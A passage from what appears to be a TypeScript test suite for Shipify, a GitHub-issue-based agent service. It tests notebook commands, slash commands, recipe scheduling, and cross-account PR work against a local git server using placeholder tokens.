    ) as { issue: { body: string } } | undefined;
    expect(page?.issue.body).toMatch(/^- Ana designs \(\d{4}-\d{2}-\d{2}\)$/m);
    // The same words again aren't noted twice, whatever their date.
    say("remember People: Ana designs");
    await job("issue_comment", "created");
    expect(replies().at(-1)?.c.body).toContain("Already noted under People");
    // forget: removes the one line holding the words.
    say("forget: ana");
    await job("issue_comment", "created");
    expect(replies().at(-1)?.c.body).toContain("Forgot, from People: Ana designs.");
    const after = Object.values(read().others).find(
      (o) => (o as { issue: { title: string } }).issue.title === "Notebook: People",
    ) as { issue: { body: string; state: string } };
    expect(after.issue.body).not.toContain("Ana");
    // Its last note gone, the page closes: nothing stays behind.
    expect(after.issue.state).toBe("closed");
    expect(replies().at(-1)?.c.body).toContain("The page is empty now, so it's closed.");
    // A repo's own notes (ADR 0047): its page, named as the repo is, for the tasks on it.
    say("remember acme/api: run npm test before a PR");
    await job("issue_comment", "created");
    expect(replies().at(-1)?.c.body).toMatch(
      /Noted for acme\/api: run npm test before a PR\. Every task on acme\/api follows it from now on: https:\/\//,
    );
    expect(
      Object.values(read().others).some(
        (o) => (o as { issue: { title: string } }).issue.title === "Notebook: acme/api",
      ),
    ).toBe(true);
  });

  it("writes a note said beside other words, and the agent answers the rest, in one run", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    say("remember: answers in bullets");
    say("and how much memory is free?");
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "2 GB of memory free." });
    const r = await job("issue_comment", "created");
    expect(r.do).toBe("think");
    const bodies = replies().map((x) => x.c.body);
    expect(bodies.some((b) => b.includes("Noted under Preferences: answers in bullets"))).toBe(
      true,
    );
    expect(bodies.at(-1)).toContain("2 GB of memory free.");
  });

  it("the due run's own write, no run for it: a quiet day's close (ADR 0040)", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    const labels = () => read().issue.labels.map((l: { name: string }) => l.name);
    expect(labels()).toContain("answered");
    const before = read().calls.length;
    // Shipify's own repos, from the read the apps list makes with the bot's key (ADR 0047).
    process.env.SHIPIFY_READ_TOKEN = "bot-read";
    set((f) => {
      (f as Fake & { installs: unknown }).installs = {
        "bot-read": [
          { name: "spotter", full_name: "o/spotter" },
          { name: "shipify", full_name: "o/shipify" },
          { name: "old", full_name: "o/old", archived: true },
        ],
      };
      // A project by its shipify.json, read for every repo in one query.
      (f as Fake & { files: unknown }).files = {
        "o/spotter/shipify.json": JSON.stringify({ id: "spotter", kind: "app" }),
      };
    });
    const due = taskDue(new Date(Date.now() + 2 * 24 * 3600_000));
    expect(due.data?.repos).toEqual([
      { name: "shipify", project: false },
      { name: "spotter", project: true },
    ]);
    expect(read().issue.state).toBe("closed");
    expect(labels()).not.toContain("answered");
    expect(
      read()
        .calls.slice(before)
        .some((c) => c.includes("dispatches")),
    ).toBe(false);
    expect(due.data?.events).toEqual(["closed #12 (a quiet day)"]);
  });

  it("answers `/help` as a comment with no agent, the words a chat gets", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    say("/help");
    const r = await job("issue_comment", "created");
    expect(r.do).toBe("box");
    expect(r.think).toBeUndefined();
    expect(replies().at(-1)?.c.body).toContain("/ping:");
    // No agent ran, so its reply has no run line: never the last run's, left on the box.
    expect(replies()[0]?.line?.brief).toBeTruthy();
    expect(replies().at(-1)?.line?.brief).toBeUndefined();
    expect(replies().at(-1)?.line?.run).toBeUndefined();
  });

  it("answers `/tasks` and `/use` as comments with no agent: the list, and the task's pick with what it takes", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    say("/tasks");
    expect((await job("issue_comment", "created")).think).toBeUndefined();
    expect(replies().at(-1)?.c.body).toMatch(/Answered\n#12 · /);
    say("/use");
    expect((await job("issue_comment", "created")).think).toBeUndefined();
    expect(replies().at(-1)?.c.body).toContain("This task uses Auto. A `use` takes an agent (");
    say("/use opus");
    await job("issue_comment", "created");
    expect(status().use).toMatchObject({ model: "opus" });
    expect(replies().at(-1)?.c.body).toContain("From the next run: Opus.");
  });

  it("keeps recipes and their tasks in step: a new file gets its task and run; a removed one, its run (ADR 0032)", () => {
    const root = mkdtempSync(join(tmpdir(), "recipes-"));
    mkdirSync(join(root, "recipes"));
    writeFileSync(
      join(root, "recipes", "brief.md"),
      "---\nwhen: every weekday at 08:30\n---\nBrief me.\n",
    );
    writeFileSync(join(root, "recipes", "broken.md"), "---\nwhen: sometimes\n---\nx\n");
    const kept = keepRecipes(root);
    const made = Object.values(read().others).find(
      (o) => (o as { issue: { title: string } }).issue.title === "Recipe: brief",
    ) as { issue: { number: number; labels: { name: string }[] } } | undefined;
    expect(made?.issue.labels.map((l) => l.name).sort()).toEqual(["recipe", "repeats"]);
    expect(kept.rows).toEqual([{ name: "brief", task: made?.issue.number }]);
    expect(kept.problems).toEqual([
      { file: "recipes/broken.md", problem: expect.stringContaining("isn't a schedule") },
    ]);
    expect(
      read().calls.some(
        (c) => c.startsWith("workflow run task.yml") && c.includes(`issue=${made?.issue.number}`),
      ),
    ).toBe(true);
    // Its file removed: its open task's run is started, to end it; nothing new is opened.
    rmSync(join(root, "recipes", "brief.md"));
    const before = Object.keys(read().others).length;
    const after = keepRecipes(root);
    expect(after.rows).toEqual([]);
    expect(Object.keys(read().others)).toHaveLength(before);
    expect(after.events.some((e) => e.includes("its recipe was removed"))).toBe(true);
  });

  it("opens no recipe task when GitHub can't list them: the record keeps what it had", () => {
    const root = mkdtempSync(join(tmpdir(), "recipes-"));
    mkdirSync(join(root, "recipes"));
    writeFileSync(
      join(root, "recipes", "brief.md"),
      "---\nwhen: every weekday at 08:30\n---\nBrief me.\n",
    );
    set((f) => {
      (f as unknown as { noRecipeList: boolean }).noRecipeList = true;
    });
    const kept = keepRecipes(root);
    expect(kept.rows).toBeUndefined();
    expect(Object.keys(read().others)).toHaveLength(0);
    expect(kept.events[0]).toContain("couldn't list the recipes' tasks");
  });

  it("ends a recipe whose file was removed: the repeat stops, the task closes, it says why", async () => {
    // A recipe's task is opened by Shipify: its replies reach your default channels too.
    process.env.SHIPIFY_SEND = "telegram";
    process.env.SHIPIFY_PEOPLE = JSON.stringify([
      { name: "owner", on: { github: "owner", telegram: "42" } },
    ]);
    set((f) => {
      f.issue.title = "Recipe: nothere";
      f.issue.labels = [{ name: "recipe" }, { name: "repeats" }];
      f.issue.user = { login: "github-actions[bot]" };
    });
    const r = await job("workflow_dispatch");
    expect(r.do).toBe("box");
    expect(read().issue.state).toBe("closed");
    expect(replies().at(-1)?.c.body).toContain("`recipes/nothere.md` was removed from main");
    expect(replies().at(-1)?.line?.to).toEqual(["telegram:42"]);
  });

  it("reads `#12 close` from a chat as the word close: the task's own number is dropped", async () => {
    process.env.FAKE_RESULT = JSON.stringify({ v: 2, state: "done", text: "About 12 GB free." });
    await job("issues", "opened");
    say(
      `${fromLine({ v: 1, person: "owner", channel: "telegram", chat: "42", id: "9" })}\n#12 close`,
      "shipify-door[bot]",
    );
    const r = await job("issue_comment", "created");
    expect(r.do).toBe("box");
    expect(read().issue.state).toBe("closed");
    expect(replies().at(-1)?.c.body).toContain("Closed");
  });
});

describe("a task on another of your accounts, end to end (ADR 0045)", () => {
  /**
   * `acme/api` on "GitHub": a repo of acme's, another of your accounts, whose default branch is
   * `master`, served by git's own server as onProject's is; the repos App's tokens for it, and the
   * Apps' bots as GitHub knows them.
   */
  async function onAccount(): Promise<string> {
    const dir = dirname(file);
    const origin = join(dir, "acme", "api.git");
    git(dir, "init", "-q", "--bare", "-b", "master", origin);
    git(origin, "config", "uploadpack.allowFilter", "true");
    git(origin, "config", "uploadpack.allowAnySHA1InWant", "true");
    const seed = join(dir, "seed-acme");
    git(dir, "clone", "-q", origin, seed);
    writeFileSync(join(seed, "AGENTS.md"), "# api\n\nRun `npm test` before a PR.\n");
    git(seed, "add", "-A");
    git(seed, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "first");
    git(seed, "push", "-q", "origin", "master");
    const port = await freePort();
    daemon = spawn(
      "git",
      [
        "daemon",
        "--reuseaddr",
        "--export-all",
        "--enable=receive-pack",
        `--base-path=${join(dir, "acme")}`,
        "--listen=127.0.0.1",
        `--port=${port}`,
        join(dir, "acme"),
      ],
      { stdio: "ignore" },
    );
    const url = `git://127.0.0.1:${port}/`;
    for (let i = 0; i < 50; i++) {
      try {
        git(dir, "ls-remote", `${url}api.git`);
        break;
      } catch {
        await new Promise((r) => setTimeout(r, 100));
      }
    }
    const home = join(dir, "home");
    mkdirSync(home, { recursive: true });
    writeFileSync(
      join(home, ".gitconfig"),
      `[url "${url}"]\n\tinsteadOf = https://github.com/acme/\n`,
    );
    Object.assign(process.env, {
      HOME: home,
      GIT_CONFIG_GLOBAL: join(home, ".gitconfig"),
      // acme by its id on GitHub, as `ship bot repos acme` pins it.
      SHIPIFY_ACCOUNTS: "acme:77",
      SHIPIFY_REPOS_SLUG: "o-shipify-repos",
      SHIPIFY_BOT_SLUG: "o-shipify",
      // The tokens task.yml mints for acme: plan's, the agent's, and apply's write one.
      SHIPIFY_READ_TOKEN: "bot-read",
      SHIPIFY_ACCOUNT_TOKEN: "acme-read",
      SHIPIFY_ACCOUNT_READ_TOKEN: "acme-agent",
      SHIPIFY_AGENT_READ_TOKEN: "bot-agent",
      SHIPIFY_WRITE_TOKEN: "acme-write",
      SHIPIFY_JOT_READ: "a-jot-key",
    });
    // As on a box, where the agent starts with an empty environment: its clone's own name is what
    // its commits carry, not the test sandbox's.
    for (const k of [
      "GIT_AUTHOR_NAME",
      "GIT_AUTHOR_EMAIL",
      "GIT_COMMITTER_NAME",
      "GIT_COMMITTER_EMAIL",
    ])
      delete process.env[k];
    set((f) => {
      f.issue.title = "acme/api: rate-limit /login";
      (f as Fake & { installs: unknown }).installs = {
        "acme-read": [
          {
            name: "api",
            full_name: "acme/api",
            size: 10,
            default_branch: "master",
            owner: { id: 77 },
          },
        ],
      };
      (f as Fake & { users: unknown }).users = { "o-shipify-repos[bot]": { id: 4242 } };
      // Your notebook: a page for all, and acme/api's own (ADR 0047).
      const page = (number: number, title: string, body: string) => ({
        issue: {
          number,
          title,
          body,
          state: "open",
          labels: [{ name: "notebook" }],
          user: { login: "owner" },
        },
        comments: [],
      });
      f.others = {
        30: page(30, "Notebook: Preferences", "- Answers in bullets\n"),
        31: page(31, "Notebook: acme/api", "- Run npm test before a PR\n"),
      };
    });
    return origin;
  }

  it("works on its repo's default branch with that account's keys alone, and opens the PR there", async () => {
    const origin = await onAccount();
    // Its master takes signed commits only, by a ruleset: the reply says so (Shipify's aren't).
    set((f) => {
      (f as Fake & { rules: unknown }).rules = { "acme/api@master": ["required_signatures"] };
    });
    process.env.FAKE_WORK = "ok";
    const r = await job("issues", "opened");
    // The task step named the account; plan's tokens were for it.
    expect(out("account")).toBe("acme");
    expect(r.do).toBe("think");
    expect(out("profile")).toBe("work");
    // The bot's token for Shipify's record alone; the repos App's for the repo on acme.
    expect(out("repos")).toBe("shipify");
    expect(out("account_repos")).toBe("api");
    // Its write token: the repos App's, on acme, for that one repo.
    expect(out("repo")).toBe("api");
    expect(/^account=acme$/m.test(readFileSync(outputs, "utf8"))).toBe(true);
    expect(r.apply.status).toBe("succeeded");
    // The agent held acme's key, was offered no tool (the jot tool's key is set here), and its
    // prompt has no tools and of the notebook only acme/api's own page, which it adds nothing to
    // (ADR 0047; what it was handed, in its run's out/).
    const kept = join(workspace(), ".tasks", "12", "agent", "out");
    const env = JSON.parse(readFileSync(join(kept, "first-env.json"), "utf8"));
    expect(env.github).toBe("acme-agent");
    // Shipify's skills, linked where Claude Code reads its own (ADR 0038): how to work, nothing
    // of yours, so a run on another account has them too.
    expect(env.skills).toEqual(expect.arrayContaining(["notion", "systematic-debugging"]));
    expect(readFileSync(join(kept, "first-argv.json"), "utf8")).not.toContain("--mcp-config");
    const prompt = readFileSync(join(kept, "first-prompt.md"), "utf8");
    expect(prompt).toContain("## Another of the owner's accounts");
    expect(prompt).toContain("Its default branch is `master`");
    expect(prompt).toContain("Run npm test before a PR");
    expect(prompt).not.toContain("Answers in bullets");
    expect(prompt).toContain("This run doesn't add to the notebook.");
    expect(prompt).not.toContain("## Tools (look only)");
    // The PR: on the task's branch, against master, in the App's name, its footer without the run.
    const branch = branches(origin).find((b) => b.startsWith("task/12-")) as string;
    expect(branch).toBeTruthy();
    expect(git(origin, "log", "-1", "--format=%an <%ae>", branch).trim()).toBe(
      "o-shipify-repos[bot] <4242+o-shipify-repos[bot]@users.noreply.github.com>",
    );
    expect(git(origin, "rev-list", "--count", `master..${branch}`).trim()).toBe("1");
    const create = read().calls.find((c) => c.startsWith("pr create -R acme/api")) ?? "";
    expect(create).toContain("--base master");
    expect(read().prs).toEqual({ "https://github.com/acme/api/pull/1": "OPEN" });
    expect(create).toMatch(/---\nCloses o\/shipify#12\nMade by [^\n]+ with Shipify\./);
    expect(create).not.toContain("in [this run]");
    expect(lastReply()?.c.body).toContain(
      "acme/api's `master` takes signed commits only, and Shipify's are pushed unsigned",
    );
    expect(status()?.project).toBe("acme/api");
    // Asked on GitHub, /repos names the account, with no agent: its repos go by owner/name.
    say("/repos");
    expect((await job("issue_comment", "created")).think).toBeUndefined();
    expect(replies().at(-1)?.c.body).toContain(
      "acme: name a repo as acme/<repo>. The first task checks Shipify can reach it.",
    );
  }, 90_000);

  it("asked why its checks failed and to fix them: the same PR while it's open, a new one once merged", async () => {
    const origin = await onAccount();
    process.env.FAKE_WORK = "ok";
    await job("issues", "opened");
    const url = "https://github.com/acme/api/pull/1";
    expect(read().prs).toEqual({ [url]: "OPEN" });
    const branch = branches(origin).find((b) => b.startsWith("task/12-")) as string;
    // Open: the fix goes on the same branch, and the same PR is updated.
    say("why did the checks fail? fix them");
    const asked = await job("issue_comment", "created");
    expect(asked.do).toBe("think");
    expect(out("profile")).toBe("work");
    expect(git(origin, "rev-list", "--count", `master..${branch}`).trim()).toBe("2");
    expect(Object.keys(read().prs ?? {})).toEqual([url]);
    // Merged: the fix is a new PR, against master again.
    set((f) => {
      f.prs = { [url]: { state: "MERGED", mergeCommit: { oid: "m1" } } };
    });
    say("it merged, but the checks fail on master now: fix it");
    await job("issue_comment", "created");
    expect(read().prs?.["https://github.com/acme/api/pull/2"]).toBe("OPEN");
    // On a branch of its own from master: the merged one's commits are not in it again.
    expect(git(origin, "rev-list", "--count", `master..${branch}-r2`).trim()).toBe("1");
    expect(
      read().calls.filter((c) => c.startsWith("pr create -R acme/api --base master")),
    ).toHaveLength(2);
    // Nothing follows its checks after that: you look, and ask again.
    expect(read().issue.labels.map((l) => l.name)).not.toContain("deploying");
  }, 180_000);

  it("closes its PR there with that account's token when you start over (ADR 0045)", async () => {
    await onAccount();
    const url = "https://github.com/acme/api/pull/1";
    set((f) => {
      f.prs = { [url]: "OPEN" };
      f.comments.push({
        id: f.nextId++,
        body: renderStatus({
          ...newState(),
          project: "acme/api",
          ownRules: true,
          prs: [url],
          prInfo: { [url]: { kind: "code", state: "open" } },
          pending: { closePrs: [url] },
        } as TaskState),
        user: { login: "github-actions[bot]" },
        created_at: new Date().toISOString(),
      });
    });
    // The github job, as task.yml runs it: the task step, then its token for acme, then the work.
    Object.assign(process.env, {
      EVENT: "workflow_dispatch",
      JOB: "github",
      GITHUB_RUN_ID: "901",
      SHIPIFY_ACCOUNT_TOKEN: "acme-prs",
    });
    writeFileSync(outputs, "");
    await runTask(12);
    expect(out("account")).toBe("acme");
    // Its token is for that PR's repo alone.
    expect(out("pr_repos")).toBe("api");
    await runGithub(12);
    expect(read().prs?.[url]).toBe("CLOSED");
    expect((read() as Fake & { closedBy: Record<string, string> }).closedBy[url]).toBe("acme-prs");
    expect(status()?.pending.closePrs).toBeUndefined();
  }, 60_000);

  it("says which PR to close by hand when there's no token for that account (ADR 0045)", async () => {
    await onAccount();
    const url = "https://github.com/acme/api/pull/1";
    set((f) => {
      f.prs = { [url]: "OPEN" };
      f.comments.push({
        id: f.nextId++,
        body: renderStatus({
          ...newState(),
          project: "acme/api",
          ownRules: true,
          prs: [url],
          prInfo: { [url]: { kind: "code", state: "open" } },
          pending: { closePrs: [url] },
        } as TaskState),
        user: { login: "github-actions[bot]" },
        created_at: new Date().toISOString(),
      });
    });
    // The App gone from acme: its mint in task.yml found no installation.
    delete process.env.SHIPIFY_ACCOUNT_TOKEN;
    Object.assign(process.env, { EVENT: "workflow_dispatch", JOB: "github", GITHUB_RUN_ID: "902" });
    writeFileSync(outputs, "");
    await runTask(12);
    await runGithub(12);
    expect(read().prs?.[url]).toBe("OPEN");
    expect(lastReply()?.line).toMatchObject({ kind: "needs-you" });
    expect(lastReply()?.c.body).toContain(`close them on GitHub:\n- ${url}`);
    expect(lastReply()?.c.body).toContain("the repos App needs to be installed there");
  }, 60_000);

  it("names the fix, with no agent, when the repos App isn't on that account", async () => {
    await onAccount();
    delete process.env.SHIPIFY_ACCOUNT_TOKEN;
    const r = await job("issues", "opened");
    expect(out("account")).toBe("acme");
    // The box answers itself: no agent runs to say it, and nothing changes.
    expect(r.do).toBe("box");
    expect(r.think).toBeUndefined();
    expect(r.apply.status).toBe("succeeded");
    expect(lastReply()?.line).toMatchObject({ kind: "needs-you" });
    const said = lastReply()?.c.body ?? "";
    expect(said).toContain("https://github.com/apps/o-shipify-repos/installations/new");
    expect(said).toContain("A read-only token for plan on the task's other account");
    expect(read().prs ?? {}).toEqual({});
  }, 90_000);

  it("trusts the account you added by its id: a login someone else holds now isn't it", async () => {
    await onAccount();
    // acme's login was given up, and someone else took it: GitHub's id for it is another.
    process.env.SHIPIFY_ACCOUNTS = "acme:999";
    const r = await job("issues", "opened");
    expect(r.do).toBe("box");
    expect(lastReply()?.c.body).toContain("`acme` is another account now");
    expect(read().prs ?? {}).toEqual({});
  }, 90_000);

  it("keeps a new project on Shipify's own account, whatever its words look at", async () => {
    await onAccount();
    set((f) => {
      f.issue.title = "new: a dashboard";
      f.issue.body = "look at acme/api for its data";
    });
    Object.assign(process.env, { EVENT: "issues", ACTION: "opened", GITHUB_RUN_ID: "903" });
    writeFileSync(outputs, "");
    await runTask(12);
    expect(out("account")).toBe("");
  }, 30_000);
});

describe("a whole run from the built CLI, every step as a box starts it (ADR 0051 B1)", () => {
  let file: string;
  beforeAll(() => {
    // Its own name in cli/dist (two folders down, as the box's), so no other test file's build races it.
    file = join(ROOT, "cli", "dist", "flow-test.mjs");
    execFileSync(process.execPath, [join(ROOT, "scripts", "build-cli.mjs"), "--out", file], {
      cwd: ROOT,
    });
  }, 60_000);
  beforeEach(() => {
    built = file;
  });
  afterEach(() => {
    built = undefined;
  });

  it("never says the same reply twice, a job re-run included", neverTwice, 90_000);
  it(
    "makes a change: the agent's commit, the box's checks, the PR on the task's branch",
    aChange,
    120_000,
  );
});
